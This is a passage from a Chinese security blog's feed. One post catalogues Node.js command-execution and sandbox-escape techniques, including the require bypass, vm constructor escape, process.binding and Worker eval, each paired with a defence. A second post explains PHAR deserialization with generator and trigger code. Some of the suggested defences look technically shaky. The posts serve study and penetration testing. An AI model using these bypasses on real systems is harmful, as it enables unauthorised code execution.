class="keyword">if</span> (error) <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error: <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Output: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ <strong>标准方法</strong>，官方推荐。<br>✅ 可以获取命令的 <strong>完整输出</strong>（<code>stdout</code>&#x2F;<code>stderr</code>）。<br>❌ 如果用户输入未过滤，可能导致 <strong>命令注入（RCE）</strong>。  </p><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>使用 <code>execFile</code>（避免 Shell 解析）：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">execFile</span>(<span class="string">&#x27;ls&#x27;</span>, [<span class="string">&#x27;-la&#x27;</span>], <span class="function">(<span class="params">error, stdout</span>) =&gt;</span> &#123; ... &#125;);</span><br></pre></td></tr></table></figure></div></li><li>对用户输入进行 <strong>严格过滤</strong>（如白名单校验）。</li></ul><hr><h2 id="2-process-mainModule-constructor-load（绕过-require-限制）"><a href="#2-process-mainModule-constructor-load（绕过-require-限制）" class="headerlink" title="2. process.mainModule.constructor._load（绕过 require 限制）"></a><strong>2. <code>process.mainModule.constructor._load</code>（绕过 <code>require</code> 限制）</strong></h2><h3 id="适用场景-1"><a href="#适用场景-1" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>某些环境禁用 <code>require</code>，但仍需动态加载模块（如沙箱逃逸）。</li></ul><h3 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> childProcess = <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">childProcess.<span class="title function_">exec</span>(<span class="string">&#x27;恶意命令&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 可以绕过部分 <strong><code>require</code> 限制</strong>。<br>❌ 依赖 <code>global.process</code> 的访问权限。<br>❌ <strong>容易被安全工具检测</strong>（如 WAF）。  </p><h3 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>禁止修改 <code>global.process</code>：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">freeze</span>(<span class="variable language_">global</span>.<span class="property">process</span>);</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="3-vm-沙箱逃逸（利用漏洞执行命令）"><a href="#3-vm-沙箱逃逸（利用漏洞执行命令）" class="headerlink" title="3. vm 沙箱逃逸（利用漏洞执行命令）"></a><strong>3. <code>vm</code> 沙箱逃逸（利用漏洞执行命令）</strong></h2><h3 id="适用场景-2"><a href="#适用场景-2" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>当代码运行在 <code>vm</code> 沙箱中，但沙箱配置不严格时。</li></ul><h3 id="代码示例-2"><a href="#代码示例-2" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">`</span></span><br><span class="line"><span class="string">  this.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).exec(&#x27;恶意命令&#x27;);</span></span><br><span class="line"><span class="string">`</span>);</span><br><span class="line">script.<span class="title function_">runInNewContext</span>(&#123;&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 可绕过简单沙箱限制。<br>❌ 依赖 <strong>沙箱配置错误</strong>（如未隔离原型链）。<br>❌ 高版本 Node.js 已修复部分漏洞。  </p><h3 id="防御措施-2"><a href="#防御措施-2" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>使用更安全的沙箱（如 <a href="https://github.com/patriksimek/vm2"><code>vm2</code></a>）。</li><li>禁止访问 <code>constructor</code>：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">vm.<span class="title function_">runInNewContext</span>(<span class="string">&#x27;代码&#x27;</span>, &#123;&#125;, &#123; <span class="attr">timeout</span>: <span class="number">1000</span> &#125;);</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="4-process-binding（底层-API）"><a href="#4-process-binding（底层-API）" class="headerlink" title="4. process.binding（底层 API）"></a><strong>4. <code>process.binding</code>（底层 API）</strong></h2><h3 id="适用场景-3"><a href="#适用场景-3" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>需要直接调用 Node.js 底层 C++ 绑定（如 <code>spawn_sync</code>）。</li></ul><h3 id="代码示例-3"><a href="#代码示例-3" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">process.<span class="title function_">binding</span>(<span class="string">&#x27;spawn_sync&#x27;</span>).<span class="title function_">spawn</span>(&#123;</span><br><span class="line">  <span class="attr">file</span>: <span class="string">&#x27;bash&#x27;</span>,</span><br><span class="line">  <span class="attr">args</span>: [<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;恶意命令&#x27;</span>],</span><br><span class="line">  <span class="attr">stdio</span>: [<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;pipe&#x27;</span>]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><h3 id="特点-3"><a href="#特点-3" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 绕过 <code>child_process</code> 模块限制。<br>❌ <strong>依赖 Node.js 版本</strong>（新版可能移除该 API）。<br>❌ 需要进程权限。  </p><h3 id="防御措施-3"><a href="#防御措施-3" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>限制 <code>process.binding</code> 访问：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> process.<span class="property">binding</span>;</span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="5-Worker-Threads（多线程执行）"><a href="#5-Worker-Threads（多线程执行）" class="headerlink" title="5. Worker Threads（多线程执行）"></a><strong>5. <code>Worker Threads</code>（多线程执行）</strong></h2><h3 id="适用场景-4"><a href="#适用场景-4" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>在 Worker 线程中隐藏恶意代码。</li></ul><h3 id="代码示例-4"><a href="#代码示例-4" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Worker</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;worker_threads&#x27;</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">`</span></span><br><span class="line"><span class="string">  const &#123; exec &#125; = require(&#x27;child_process&#x27;);</span></span><br><span class="line"><span class="string">  exec(&#x27;恶意命令&#x27;);</span></span><br><span class="line"><span class="string">`</span>, &#123; <span class="attr">eval</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure></div><h3 id="特点-4"><a href="#特点-4" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 可绕过主线程监控。<br>❌ 需要启用 <code>eval: true</code>。<br>❌ 可能被 <strong>进程监控工具</strong> 发现。  </p><h3 id="防御措施-4"><a href="#防御措施-4" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>禁止动态 Worker 代码：<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">&#x27;file.js&#x27;</span>); <span class="comment">// 只允许文件加载</span></span><br></pre></td></tr></table></figure></div></li></ul><hr><h2 id="6-fs-exec（写入脚本后执行）"><a href="#6-fs-exec（写入脚本后执行）" class="headerlink" title="6. fs + exec（写入脚本后执行）"></a><strong>6. <code>fs + exec</code>（写入脚本后执行）</strong></h2><h3 id="适用场景-5"><a href="#适用场景-5" class="headerlink" title="适用场景"></a><strong>适用场景</strong></h3><ul><li>当直接执行命令被拦截，但允许写入文件时。</li></ul><h3 id="代码示例-5"><a href="#代码示例-5" class="headerlink" title="代码示例"></a><strong>代码示例</strong></h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line">fs.<span class="title function_">writeFileSync</span>(<span class="string">&#x27;/tmp/exploit.sh&#x27;</span>, <span class="string">&#x27;恶意命令&#x27;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;bash /tmp/exploit.sh&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="特点-5"><a href="#特点-5" class="headerlink" title="特点"></a><strong>特点</strong></h3><p>✅ 可绕过简单命令黑名单。<br>❌ 依赖 <strong>文件写入权限</strong>。<br>❌ 可能被 <strong>文件监控</strong> 检测。  </p><h3 id="防御措施-5"><a href="#防御措施-5" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h3><ul><li>限制临时目录写入权限。</li><li>监控敏感文件创建（如 <code>/tmp/exploit.sh</code>）。</li></ul><hr><h2 id="总结对比表"><a href="#总结对比表" class="headerlink" title="总结对比表"></a><strong>总结对比表</strong></h2><table><thead><tr><th>方法</th><th>适用场景</th><th>绕过能力</th><th>防御措施</th></tr></thead><tbody><tr><td><code>child_process.exec</code></td><td>常规命令执行</td><td>❌</td><td>输入过滤 + <code>execFile</code></td></tr><tr><td><code>process.mainModule._load</code></td><td>绕过 <code>require</code> 限制</td><td>✅</td><td>冻结 <code>global.process</code></td></tr><tr><td><code>vm</code> 沙箱逃逸</td><td>沙箱环境</td><td>✅（需漏洞）</td><td>使用 <code>vm2</code> 沙箱</td></tr><tr><td><code>process.binding</code></td><td>底层 API 调用</td><td>✅</td><td>删除 <code>process.binding</code></td></tr><tr><td><code>Worker Threads</code></td><td>多线程隐藏执行</td><td>✅</td><td>禁用 <code>eval: true</code></td></tr><tr><td><code>fs + exec</code></td><td>文件写入后执行</td><td>✅</td><td>文件监控 + 权限限制</td></tr></tbody></table><hr><h2 id="终极防御建议"><a href="#终极防御建议" class="headerlink" title="终极防御建议"></a><strong>终极防御建议</strong></h2><ol><li><strong>最小权限原则</strong>：Node.js 进程以低权限用户运行。</li><li><strong>输入过滤</strong>：禁止用户输入进入 <code>exec</code>、<code>eval</code> 等。</li><li><strong>依赖检查</strong>：避免使用恶意第三方包（如 <code>npm audit</code>）。</li><li><strong>WAF</strong>：使用 Web 应用防火墙拦截可疑请求。</li><li><strong>沙箱隔离</strong>：敏感操作放在受限环境（如 Docker、<code>vm2</code>）。</li></ol><hr><p>⚠️ <strong>重要提醒</strong>：以上方法仅限 <strong>授权渗透测试</strong>，未经授权使用属 <strong>违法行为</strong>！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="nodejs" scheme="http://example.com/categories/nodejs/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="ai写的" scheme="http://example.com/tags/ai%E5%86%99%E7%9A%84/"/>
    
  </entry>
  
  <entry>
    <title>Phar反序列化</title>
    <link href="http://example.com/2025/03/20/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2025/03/20/web/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-03-20T21:10:52.000Z</published>
    <updated>2025-04-26T11:30:29.888Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Phar反序列化是一种利用Phar文件的特性进行攻击的方法。Phar文件是一种压缩文件，类似于Java中的JAR包，Phar文件会以序列化的形式存储用户自定义的meta-data，从而扩展反序列化漏洞的攻击面</p><h2 id="反序列化的条件"><a href="#反序列化的条件" class="headerlink" title="反序列化的条件"></a>反序列化的条件</h2><p>要实现Phar反序列化，需要满足以下几个条件：</p><p>Phar文件能够上传到服务器端：攻击者需要能够将Phar文件上传到目标服务器，以便利用Phar文件中的序列化数据进行反序列化攻击</p><p>存在可利用的魔术方法：Phar文件中的meta-data会在反序列化时被解析，因此需要有可利用的魔术方法（如__destruct、__wakeup等）作为“跳板”，以便在反序列化过程中执行恶意代码</p><p>文件操作函数的参数可控：需要能够控制文件操作函数的参数，并且这些参数中包含特殊字符（如:、&#x2F;、phar等）没有被过滤。这样可以通过Phar伪协议读取并解析Phar文件，从而触发反序列化</p><h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><p>以下是一个简单的Phar文件生成示例：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject &#123;</span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">echo &#x27;Destruct called&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); // 后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 设置stub</span><br><span class="line">$o = new TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o); // 将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); // 添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><p>在生成Phar文件后，可以通过以下代码触发反序列化：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename = &#x27;phar://phar.phar/test.txt&#x27;;</span><br><span class="line">file_get_contents($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><h2 id="重要注意事项"><a href="#重要注意事项" class="headerlink" title="重要注意事项"></a>重要注意事项</h2><p>在进行Phar反序列化攻击时，需要注意以下几点：</p><p>Phar文件的生成：生成Phar文件时，需要将php.ini中的phar.readonly选项设置为Off，否则无法生成Phar文件</p><p>绕过检测 条件竞争等方案来传🐎</p><p>通过满足上述条件，可以在不调用unserialize()函数的情况下实现Phar反序列化攻击，从而执行恶意代码。</p><p><a class="link"   href="https://xz.aliyun.com/news/6303?time__1311=YqIxgD070=BDlhzG7FD8K9P0K4Dv=NdG8AeD&u_atoken=2ce2353c671e67892a58d8137a023870&u_asig=0a472f8c17424763875994781e014c" >这个更详细 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="php反序列化" scheme="http://example.com/categories/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
    <category term="php伪协议" scheme="http://example.com/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
</feed>
